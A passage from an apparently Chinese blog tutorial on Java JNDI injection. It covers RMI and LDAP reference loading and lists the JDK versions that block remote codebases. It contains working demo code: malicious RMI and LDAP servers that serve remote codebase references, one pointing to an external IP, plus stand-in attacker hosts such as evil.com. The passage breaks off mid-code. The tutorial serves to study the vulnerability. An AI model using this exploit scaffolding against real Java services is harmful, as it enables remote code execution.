<span class="hljs-keyword">this</span>.myProps);<br>            <span class="hljs-keyword">if</span> (localContext != <span class="hljs-keyword">null</span>) &#123; <br>                <span class="hljs-keyword">return</span> localContext;<br>            &#125;<br>        &#125;  <br>    &#125;<br>    <span class="hljs-keyword">return</span> getDefaultInitCtx();<br>&#125;<br></code></pre></div></td></tr></table></figure><p>在<code>getURLOrDefaultInitCtx</code>中会判断是否存在特定的协议，如果有代码则会使用相应的工厂去初始化上下文环境，这时候不管之前配置的工厂环境是什么，这里都会被动态地对其进行替换。</p><p>完整测试代码</p><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">package</span> JDNI.com.RMI;<br><br><span class="hljs-keyword">import</span> com.sun.jndi.rmi.registry.ReferenceWrapper;<br><br><span class="hljs-keyword">import</span> javax.naming.Context;<br><span class="hljs-keyword">import</span> javax.naming.InitialContext;<br><span class="hljs-keyword">import</span> javax.naming.NamingException;<br><span class="hljs-keyword">import</span> javax.naming.Reference;<br><span class="hljs-keyword">import</span> java.rmi.AlreadyBoundException;<br><span class="hljs-keyword">import</span> java.rmi.RemoteException;<br><span class="hljs-keyword">import</span> java.rmi.registry.LocateRegistry;<br><span class="hljs-keyword">import</span> java.rmi.registry.Registry;<br><span class="hljs-keyword">import</span> java.util.Properties;<br><br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">RMI_REMOTE_REGISTER_TEST</span> </span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> NamingException, RemoteException, AlreadyBoundException </span>&#123;<br>        System.setProperty(<span class="hljs-string">&quot;com.sun.jndi.rmi.object.trustURLCodebase&quot;</span>, String.valueOf(<span class="hljs-keyword">true</span>));<br>        System.setProperty(<span class="hljs-string">&quot;com.sun.jndi.ldap.object.trustURLCodebase&quot;</span>, <span class="hljs-string">&quot;true&quot;</span>);<br>        <span class="hljs-comment">//初始化jndi服务设置</span><br>        Properties env = <span class="hljs-keyword">new</span> Properties();<br>        <span class="hljs-comment">//初始化上下文工厂名，不同的目录服务有不同的名字。例如DNS的是“com.sun.jndi.dns.DnsContextFactory”</span><br>        env.put(Context.INITIAL_CONTEXT_FACTORY,<span class="hljs-string">&quot;com.sun.jndi.rmi.registry.RegistryContextFactory&quot;</span>);<br>        <span class="hljs-comment">//设置JNDI提供服务的URL地址</span><br>        env.put(Context.PROVIDER_URL,<span class="hljs-string">&quot;rmi://localhost:1099&quot;</span>);<br>        env.put(<span class="hljs-string">&quot;com.sun.jndi.rmi.object.trustURLCodebase&quot;</span>,<span class="hljs-keyword">true</span>);<br><br>        Context ctx = <span class="hljs-keyword">new</span> InitialContext(env);<br><br>        <span class="hljs-comment">//rmi注册</span><br>        Registry registry = LocateRegistry.createRegistry(<span class="hljs-number">1099</span>);<br>        Hello h1 = <span class="hljs-keyword">new</span> HelloImpl();<br>        registry.bind(<span class="hljs-string">&quot;hello&quot;</span>,h1);<br><br>        <span class="hljs-comment">//动态加载类</span><br>        Reference remote_load  = <span class="hljs-keyword">new</span> Reference(<span class="hljs-string">&quot;remote_load&quot;</span>,<span class="hljs-string">&quot;remote_load_test&quot;</span>,<span class="hljs-string">&quot;http://39.10.239.30/JNDI/&quot;</span>);<br>        ReferenceWrapper remote_loadWrapper = <span class="hljs-keyword">new</span> ReferenceWrapper(remote_load);<br>        registry.bind(<span class="hljs-string">&quot;remoteLoad&quot;</span>,remote_loadWrapper);<br><br>        <span class="hljs-comment">//远程服务端调用方法</span><br>        Hello reh1 = (Hello) ctx.lookup(<span class="hljs-string">&quot;hello&quot;</span>);<br>        reh1.sayHello(<span class="hljs-string">&quot;KKfine&quot;</span>);<br><br>        <span class="hljs-comment">//远程调用本地不存在的class</span><br>        Object test = ctx.lookup(<span class="hljs-string">&quot;remoteLoad&quot;</span>);<br>    &#125;<br>&#125;<br><br></code></pre></div></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/50ed7cf19e7a45339b3a7618da9668f6.png" alt="在这里插入图片描述"></p><h1 id="JNDI-References注入"><a href="#JNDI-References注入" class="headerlink" title="JNDI References注入"></a>JNDI References注入</h1><p>既然上面说到可以加载外部类，那么这里自然就联想到如果加载我们的恶意类不就能够RCE了。</p><h2 id="前提条件-amp-JDK防御"><a href="#前提条件-amp-JDK防御" class="headerlink" title="前提条件&amp;JDK防御"></a>前提条件&amp;JDK防御</h2><p>要想成功利用JNDI注入漏洞，重要的前提就是当前Java环境的JDK版本，而JNDI注入中不同的攻击向量和利用方式所被限制的版本号都有点不一样。</p><p>这里将所有不同版本JDK的防御都列出来：</p><ul><li>JDK 6u45、7u21之后：<code>java.rmi.server.useCodebaseOnly</code>的默认值被设置为true。当该值为true时，将禁用自动加载远程类文件，仅从CLASSPATH和当前JVM的<code>java.rmi.server.codebase</code>指定路径加载类文件。使用这个属性来防止客户端VM从其他Codebase地址上动态加载类，增加了RMI ClassLoader的安全性。</li><li>JDK 6u141、7u131、8u121之后：增加了<code>com.sun.jndi.rmi.object.trustURLCodebase</code>选项，默认为false，禁止RMI和CORBA协议使用远程codebase的选项，因此RMI和CORBA在以上的JDK版本上已经无法触发该漏洞，但依然可以通过指定URI为LDAP协议来进行JNDI注入攻击。</li><li>JDK 6u211、7u201、8u191之后：增加了<code>com.sun.jndi.ldap.object.trustURLCodebase</code>选项，默认为false，禁止LDAP协议使用远程codebase的选项，把LDAP协议的攻击途径也给禁了。</li></ul><p>因此，我们在进行JNDI注入之前，必须知道当前环境JDK版本这一前提条件，只有JDK版本在可利用的范围内才满足我们进行JNDI注入的前提条件。</p><h2 id="RMI攻击"><a href="#RMI攻击" class="headerlink" title="RMI攻击"></a>RMI攻击</h2><p>利用RMI的攻击，首先就是将恶意类绑定在注册表中，恶意的远程引用指向我们的恶意类。就是在<code>lookup()</code>外部参数可控或者<code>References</code>构造中的<code>classFactoryLocation</code>参数外部可控时，将这个参数设置成我们的远程恶意类，会使用户的JNDI客户端访问注册表中的恶意引用，从而加载远程的恶意类，最终实现远程代码执行。流程如图：</p><p><img src="https://www.mi1k7ea.com/2019/09/15/%E6%B5%85%E6%9E%90JNDI%E6%B3%A8%E5%85%A5/6.png" alt="img"></p><p>1.首先就是当参数可控时，我们利用动态加载类的特性传入一个我们恶意服务器的地址比如这里是<code>rmi://evil.com:1099</code>，传入之后原先的<code>rmi://localhost:1099</code>便已经被替换掉了</p><p>2.然后这个恶意服务中<code>Reference</code>绑定的是我们的恶意对象<code>Reference(&quot;EvilObject&quot;, &quot;EvilObject&quot;, &quot;http://evil-cb.com/&quot;)</code></p><p>3.接着当客户端查询这个类时，在本地没有发现，便会查询注册表，但这是我们的恶意服务已经像注册表中提供了它所需要的类，也就是我们的恶意类，由此便会被客户端请求调用，从而执行我们的命令。</p><p>攻击demo</p><p>客户端</p><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">package</span> JDNI.com.RMIattack;<br><br><span class="hljs-keyword">import</span> javax.naming.Context;<br><span class="hljs-keyword">import</span> javax.naming.InitialContext;<br><span class="hljs-keyword">import</span> javax.naming.NamingException;<br><span class="hljs-keyword">import</span> java.util.Properties;<br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">JNDIClient</span> </span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> NamingException </span>&#123;<br><br>        System.setProperty(<span class="hljs-string">&quot;com.sun.jndi.rmi.object.trustURLCodebase&quot;</span>, String.valueOf(<span class="hljs-keyword">true</span>));<br>        System.setProperty(<span class="hljs-string">&quot;com.sun.jndi.ldap.object.trustURLCodebase&quot;</span>, <span class="hljs-string">&quot;true&quot;</span>);<br>        <br>        String uri = <span class="hljs-string">&quot;rmi://127.0.0.1/evilObj&quot;</span>;<br>        Context ctxt = <span class="hljs-keyword">new</span> InitialContext();<br>        ctxt.lookup(uri);<br>    &#125;<br>&#125;<br></code></pre></div></td></tr></table></figure><p>服务端</p><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">package</span> JDNI.com.RMIattack;<br><br><span class="hljs-keyword">import</span> com.sun.jndi.rmi.registry.ReferenceWrapper;<br><br><span class="hljs-keyword">import</span> javax.naming.Reference;<br><span class="hljs-keyword">import</span> java.rmi.RemoteException;<br><span class="hljs-keyword">import</span> java.rmi.registry.LocateRegistry;<br><span class="hljs-keyword">import</span> java.rmi.registry.Registry;<br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">RMIserver</span> </span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception </span>&#123;<br>        Registry registry = LocateRegistry.createRegistry(<span class="hljs-number">1099</span>);<br><br>        Reference evil = <span class="hljs-keyword">new</span> Reference(<span class="hljs-string">&quot;Evil&quot;</span>,<span class="hljs-string">&quot;Evil&quot;</span>,<span class="hljs-string">&quot;http://127.0.0.1:8080/&quot;</span>);<br>        ReferenceWrapper r = <span class="hljs-keyword">new</span> ReferenceWrapper(evil);<br>        System.out.println(<span class="hljs-string">&quot;Binding is Evil to rmi://127.0.0.1:1099/evilObj&quot;</span>);<br>        registry.bind(<span class="hljs-string">&quot;evilObj&quot;</span>,r);<br><br><br>    &#125;<br>&#125;<br></code></pre></div></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/8b335711c579457aac7d1fc98bcd77b5.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAcXFfNTM0ODcyNzc=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"></p><p>这里会报错是因为最后实例化远程类(<code>EvilObj</code>)的时候进行了类型转换为<code>ObjectFactory</code>类，而该类实际上是一个接口，所以如果要让它不报错就实现接口里面的方法就行了，而这个接口就只有一个方法。</p><p><img src="https://img-blog.csdnimg.cn/7cfa5314fb65423f8d614bae87269992.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAcXFfNTM0ODcyNzc=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"></p><h3 id="思考"><a href="#思考" class="headerlink" title="思考"></a>思考</h3><p>其实每次在调试的过程中总能学到很多陌生的东西，但是这些东西很少记录下来，以至于调试完就没有后续了，调试中遇到了一个很常见但是方法很多的东西就是java字节码的加载，在调用<code>getObjectFactoryFromReference</code>方法要返回实例化的注册类时，这里用了<code>static final VersionHelper helper = VersionHelper.getVersionHelper();</code>的加载方法</p><p><img src="https://img-blog.csdnimg.cn/9f1deea18f684ef7b5120c43ff52e968.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAcXFfNTM0ODcyNzc=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"></p><p>经过搜索之后发现在<code>JSP Webshell</code>经常出现这个身影，所以中间又穿插学了下<code>JSP Webshell</code>，属于看啥啥不会了，<code>JSP Webshell</code>应该会再写一篇博客了。这里简单记录一下。</p><h2 id="漏洞点分析"><a href="#漏洞点分析" class="headerlink" title="漏洞点分析"></a>漏洞点分析</h2><h4 id="lookup参数注入"><a href="#lookup参数注入" class="headerlink" title="lookup参数注入"></a><code>lookup</code>参数注入</h4><p>这种漏洞就是上面所演示的，<code>ctx.lookup()</code>中参数可控，然后动态加载我们的恶意类</p><h4 id="classFactoryLocation参数注入"><a href="#classFactoryLocation参数注入" class="headerlink" title="classFactoryLocation参数注入"></a><code>classFactoryLocation</code>参数注入</h4><p>前面lookup()参数注入是基于RMI客户端的，也是最常见的。而<code>classFactoryLocation</code>参数注入则是对于RMI服务端而言的，也就是说服务端程序在调用Reference()初始化参数时，其中的<code>classFactoryLocation</code>参数外部可控，导致存在JNDI注入。如图</p><p><img src="https://www.mi1k7ea.com/2019/09/15/%E6%B5%85%E6%9E%90JNDI%E6%B3%A8%E5%85%A5/10.png" alt="img"></p><p>将上述的JNDI客户端稍作修改即可，可以看到lookup参数已经固定而服务端参数可控。但是这里注意因为lookup直接查询远程引用对象，所以需要初始化上下文告诉客户端使用什么目录服务，并且提供服务<code>url</code>地址。</p><p> <img src="https://img-blog.csdnimg.cn/3233c91e345d4d6387c13d108f568eaf.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAcXFfNTM0ODcyNzc=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"></p><p><img src="https://img-blog.csdnimg.cn/2f508d2b36cd459bae4ccb87fe1f6b78.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAcXFfNTM0ODcyNzc=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"></p><h4 id="RMI恶意远程对象"><a href="#RMI恶意远程对象" class="headerlink" title="RMI恶意远程对象"></a>RMI恶意远程对象</h4><blockquote><p>攻击者实现一个RMI恶意远程对象并绑定到RMI Registry上，编译后的RMI远程对象类可以放在HTTP/FTP/SMB等服务器上，这个Codebase地址由远程服务器的 java.rmi.server.codebase 属性设置，供受害者的RMI客户端远程加载，RMI客户端在 lookup() 的过程中，会先尝试在本地CLASSPATH中去获取对应的Stub类的定义，并从本地加载，然而如果在本地无法找到，RMI客户端则会向远程Codebase去获取攻击者指定的恶意对象，这种方式将会受到 useCodebaseOnly 的限制。利用条件如下：</p><ol><li>RMI客户端的上下文环境允许访问远程Codebase。</li><li>属性 java.rmi.server.useCodebaseOnly 的值必需为false。</li></ol><p>然而从JDK 6u45、7u21开始，java.rmi.server.useCodebaseOnly 的默认值就是true。当该值为true时，将禁用自动加载远程类文件，仅从CLASSPATH和当前VM的java.rmi.server.codebase 指定路径加载类文件。使用这个属性来防止客户端VM从其他Codebase地址上动态加载类，增加了RMI ClassLoader的安全性。</p><p>Changelog:</p><ul><li>JDK 6u45 <a href="https://docs.oracle.com/javase/7/docs/technotes/guides/rmi/relnotes.html">https://docs.oracle.com/javase/7/docs/technotes/guides/rmi/relnotes.html</a></li><li>JDK 7u21 <a href="http://www.oracle.com/technetwork/java/javase/7u21-relnotes-1932873.html">http://www.oracle.com/technetwork/java/javase/7u21-relnotes-1932873.html</a></li></ul></blockquote><h4 id="结合反序列化漏洞"><a href="#结合反序列化漏洞" class="headerlink" title="结合反序列化漏洞"></a>结合反序列化漏洞</h4><p>这种情形其实就是漏洞类重写的readObject()方法中直接或间接调用了可被外部控制的lookup()方法，导致攻击者可以通过JNDI注入来进行反序列化漏洞的利用。</p><p>例如<code>Spring Framework的反序列化漏洞</code></p><h4 id="LDAP-Reference利用技巧"><a href="#LDAP-Reference利用技巧" class="headerlink" title="LDAP+Reference利用技巧"></a>LDAP+Reference利用技巧</h4><p>原理是一样的，也是起一个恶意的服务，只是从RMI服务变成了LDAP服务，都是能对接JNDI客户端并且返回Reference对象的。</p><p>LDAP (Lightweight Directory Access Protocol) : 轻量目录访问协议</p><blockquote><p>LDAP是一个跨平台的、标准的协议</p><p>LDAP支持TCP/IP</p><p>LDAP也是有client端和server端。server端是用来存放资源，client端用来操作增删改查等操作</p><p>LDAP是一个到目录服务的目录访问协议</p><p>目录服务：简单来讲是为了浏览和搜索数据而设计的特殊数据库（很像通讯簿，由以字母顺序排列的名字、地址和电话号码组成）</p><p>LDAP 类似于用一个树状结构将数据联系起来(和查询DNS服务挺类似的)，大致如图所示：</p></blockquote><p><img src="https://c014.cn/blog/java/pics/13.jpg" alt="img"></p><h5 id="LDAP-常见名词"><a href="#LDAP-常见名词" class="headerlink" title="LDAP 常见名词"></a>LDAP 常见名词</h5><table><thead><tr><th align="center">缩写</th><th align="center">全称</th><th align="center">含义</th></tr></thead><tbody><tr><td align="center">dc</td><td align="center">Domain Component</td><td align="center">域名的部分，其格式是将完整的域名分成几部分，如dc=domain,dc=com</td></tr><tr><td align="center">uid</td><td align="center">User Id</td><td align="center">用户ID, 如”test”</td></tr><tr><td align="center">ou</td><td align="center">Organization Unit</td><td align="center">组织单位，类似于Linux文件系统中的子目录，是一个容器对象，可以包含其他各种对象</td></tr><tr><td align="center">cn</td><td align="center">Common Name</td><td align="center">公共名称</td></tr><tr><td align="center">sn</td><td align="center">Surname</td><td align="center">姓</td></tr><tr><td align="center">dn</td><td align="center">Distinguished Name</td><td align="center">唯一辨别名，类似于绝对路径，如”uid=test,ou=sec,dc=domain,dc=com”,在一个目录树中dn总是唯一的</td></tr><tr><td align="center">rdn</td><td align="center">Relative dn</td><td align="center">相对辨别名，类似相对路径</td></tr><tr><td align="center">c</td><td align="center">Country</td><td align="center">国家</td></tr><tr><td align="center">o</td><td align="center">Organization</td><td align="center">组织名</td></tr></tbody></table><table><thead><tr><th align="center"></th><th align="center"></th></tr></thead><tbody><tr><td align="center">Directory</td><td align="center">目录，用于存放信息的单元</td></tr><tr><td align="center">Entry</td><td align="center">条目，一个entry就是一条记录，是LDAP中一个基本的存储单元</td></tr><tr><td align="center">DN：Distinguished Name</td><td align="center">条目中用于唯一区别改条目的信息</td></tr><tr><td align="center">LDIF：LDAP Interchange Format</td><td align="center">用于规范LDAP的配置和目录内容等详细信息的保存</td></tr><tr><td align="center">Objectclass</td><td align="center">LDAP对象类，是LDAP内置的数据模型。每种objectClass有自己的数据结构</td></tr></tbody></table><p><code>LDAP</code>的具体知识可以看看这篇文章<a href="https://www.cnblogs.com/kevingrace/p/5773974.html%EF%BC%8C%E8%BF%99%E9%87%8C%E4%B8%BB%E8%A6%81%E7%9C%8B%E7%9C%8BLDAP%E7%9A%84%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8">https://www.cnblogs.com/kevingrace/p/5773974.html，这里主要看看LDAP的漏洞利用</a></p><p><strong>目录树概念</strong></p><ul><li>目录树：在一个目录服务系统中，整个目录信息集可以表示为一个目录信息树，树中的每个节点是一个条目</li><li>条目：每个条目就是一条记录，每个条目有自己的唯一可区别的名称（DN）</li><li>对象类：与某个实体类型对应的一组属性，对象类是可以继承的，这样父类的必须属性也会被继承下来</li><li>属性：描述条目的某个方面的信息，一个属性由一个属性类型和一个或多个属性值组成，属性有必须属性和非必须属性。如<code>javaCodeBase</code>、<code>objectClass</code>、<code>javaFactory</code>、<code>javaSerializedData</code>、<code>javaRemoteLocation</code>等属性，在后面的利用中会用到这些属性</li></ul><h5 id="LDAP攻击"><a href="#LDAP攻击" class="headerlink" title="LDAP攻击"></a>LDAP攻击</h5><p>这里演示一个样例</p><p>客户端</p><p><img src="https://img-blog.csdnimg.cn/fbcad8b9a8434d43a31fec71fdce31fb.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAcXFfNTM0ODcyNzc=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"></p><p>服务端</p><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">package</span> JDNI.com.RMIattack;<br><br><span class="hljs-keyword">import</span> com.unboundid.ldap.listener.InMemoryDirectoryServer;<br><span class="hljs-keyword">import</span> com.unboundid.ldap.listener.InMemoryDirectoryServerConfig;<br><span class="hljs-keyword">import</span> com.unboundid.ldap.listener.InMemoryListenerConfig;<br><span class="hljs-keyword">import</span> com.unboundid.ldap.listener.interceptor.InMemoryInterceptedSearchEntry;<br><span class="hljs-keyword">import</span> com.unboundid.ldap.listener.interceptor.InMemoryInterceptedSearchResult;<br><span class="hljs-keyword">import</span> com.unboundid.ldap.listener.interceptor.InMemoryOperationInterceptor;<br><span class="hljs-keyword">import</span> com.unboundid.ldap.sdk.Entry;<br><span class="hljs-keyword">import</span> com.unboundid.ldap.sdk.LDAPException;<br><span class="hljs-keyword">import</span> com.unboundid.ldap.sdk.LDAPResult;<br><span class="hljs-keyword">import</span> com.unboundid.ldap.sdk.ResultCode;<br><br><span class="hljs-keyword">import</span> javax.net.ServerSocketFactory;<br><span class="hljs-keyword">import</span> javax.net.SocketFactory;<br><span class="hljs-keyword">import</span> javax.net.ssl.SSLSocketFactory;<br><span class="hljs-keyword">import</span> java.net.InetAddress;<br><span class="hljs-keyword">import</span> java.net.MalformedURLException;<br><span class="hljs-keyword">import</span> java.net.URL;<br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">LdapServer</span> </span>&#123;<br>    <span class="hljs-comment">//域名的部分，其格式是将完整的域名分成几部分，如域名为example.com变成dc=example,dc=com</span><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> String LDAP_BASE = <span class="hljs-string">&quot;dc=example,dc=com&quot;</span>;<br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception</span>&#123;<br>        String url = <span class="hljs-string">&quot;http://127.0.0.1:8000/#Evil2&quot;</span>;<br>        <span class="hljs-keyword">int</span> port = <span class="hljs-number">2333</span>;<br><br>        <span class="hljs-comment">//创建一个新的内存目录服务器配置对象</span><br>        InMemoryDirectoryServerConfig config = <span class="hljs-keyword">new</span> InMemoryDirectoryServerConfig(LDAP_BASE);<br>        <span class="hljs-comment">//配置在内存目录服务器中使用的侦听器</span><br>        config.setListenerConfigs(<span class="hljs-keyword">new</span> InMemoryListenerConfig(<br>           <span class="hljs-string">&quot;listen&quot;</span>, <span class="hljs-comment">//分配给此侦听器的名称</span><br>           InetAddress.getByName(<span class="hljs-string">&quot;127.0.0.1&quot;</span>),<span class="hljs-comment">// 侦听器应接受来自客户端的连接的地址。它可能 null表明它应该接受所有接口上所有地址上的连接。</span><br>                port, <span class="hljs-comment">//侦听器应接受来自客户端的连接的端口</span><br>                ServerSocketFactory.getDefault(), <span class="hljs-comment">//接受客户端连接时应用于创建套接字的套接字工厂</span><br>                SocketFactory.getDefault(), <span class="hljs-comment">// 应用于创建与服务器的客户端连接的套接字工厂</span><br>                (SSLSocketFactory) SSLSocketFactory.getDefault() <span class="hljs-comment">//应用于将 StartTLS 加密添加到现有连接的套接字工厂</span><br>        ));<br><br>        config.addInMemoryOperationInterceptor(<span class="hljs-keyword">new</span> OperationInterceptor(<span class="hljs-keyword">new</span> URL(url)));<br>        InMemoryDirectoryServer ds = <span class="hljs-keyword">new</span> InMemoryDirectoryServer(config);<br>        System.out.println(<span class="hljs-string">&quot;LDAP server is listening on 0.0.0.0:2333&quot;</span>);<br>        ds.startListening();<br>    &#125;<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">OperationInterceptor</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">InMemoryOperationInterceptor</span></span>&#123;<br>        <span class="hljs-keyword">private</span> URL codebase;<br><br>        <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-title">OperationInterceptor</span><span class="hljs-params">(URL cb)</span></span>&#123;<br>            <span class="hljs-keyword">this</span>.codebase = cb;<br>        &#125;<br><br>        <span class="hljs-comment">/**</span><br><span class="hljs-comment">         * &#123;<span class="hljs-doctag">@inheritDoc</span>&#125;</span><br><span class="hljs-comment">         *</span><br><span class="hljs-comment">         * <span class="hljs-doctag">@see</span> com.unboundid.ldap.listener.interceptor.InMemoryOperationInterceptor#processSearchResult(com.unboundid.ldap.listener.interceptor.InMemoryInterceptedSearchResult)</span><br><span class="hljs-comment">         */</span><br>        <span class="hljs-meta">@Override</span><br>        <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">processSearchResult</span> <span class="hljs-params">(InMemoryInterceptedSearchResult result)</span></span>&#123;<br>            String base = result.getRequest().getBaseDN();<br>            Entry e = <span class="hljs-keyword">new</span> Entry(base);<br>            <span class="hljs-keyword">try</span> &#123;<br>                sendResult(result,base,e);<br>            &#125;<span class="hljs-keyword">catch</span> (Exception p)&#123;<br>                p.printStackTrace();<br>            &#125;<br>        &#125;<br><br>        <span class="hljs-comment">/**</span><br><span class="hljs-comment">         * <span class="hljs-doctag">@param</span> result  an API that can be used in the course of processing a search request via the InMemoryOperationInterceptor API.</span><br><span class="hljs-comment">         * <span class="hljs-doctag">@param</span> base 根节点</span><br><span class="hljs-comment">         * <span class="hljs-doctag">@param</span> e 需要搜索的条目信息</span><br><span class="hljs-comment">         */</span><br><br>        <span class="hljs-function"><span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title">sendResult</span><span class="hljs-params">(InMemoryInterceptedSearchResult result, String base,Entry e)</span> <span class="hljs-keyword">throws</span> LDAPException, MalformedURLException </span>&#123;<br>            URL turl = <span class="hljs-keyword">new</span> URL(<span class="hljs-keyword">this</span>.codebase,<span class="hljs-keyword">this</span>.codebase.getRef().replace(<span 